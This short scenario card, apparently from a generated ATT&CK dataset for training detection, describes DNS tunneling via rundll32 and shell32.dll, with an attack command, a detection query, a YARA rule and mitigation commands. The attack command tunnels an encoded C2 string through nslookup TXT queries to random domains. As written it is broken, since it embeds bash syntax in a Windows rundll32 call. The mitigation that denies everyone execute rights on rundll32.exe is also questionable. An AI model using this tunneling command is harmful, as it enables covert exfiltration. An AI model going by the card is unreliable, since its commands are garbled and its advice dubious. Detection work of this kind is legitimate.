---
type: campaign
scenario_id: 469
tactic: Defense Evasion
technique: "T1218.011: Rundll32"
technique_id: T1218.011
tags: [campaign, lotl, defense_evasion]
---

# Using rundll32 with shell32.dll for DNS tunneling.

## Threat Description
Using rundll32 with shell32.dll for DNS tunneling.

## Attack Command
```
rundll32 shell32.dll,ShellExec_RunDLL "nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)"
```

## Detection Logic
Monitor rundll32 shell32: `wmic process where name='rundll32.exe' get commandline | findstr shell32.dll`; YARA rule: `rule Rundll32ShellDnsTunnel { strings: $a = /rundll32.*shell32.dll.*nslookup/ nocase; condition: $a }`.

## Mitigation
Restrict rundll32: `icacls %windir%\System32\rundll32.exe /deny Everyone:RX`; Block DNS queries: `netsh advfirewall firewall add rule name='Block rundll32 DNS' dir=out program='%windir%\System32\rundll32.exe' action=block`.

## AI Training Prompt
Train AI to detect rundll32 shell32.dll-based DNS tunneling by analyzing nslookup TXT queries, rundll32 command-line arguments, and DNS traffic patterns; suggest DNS restrictions.

## References
- MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
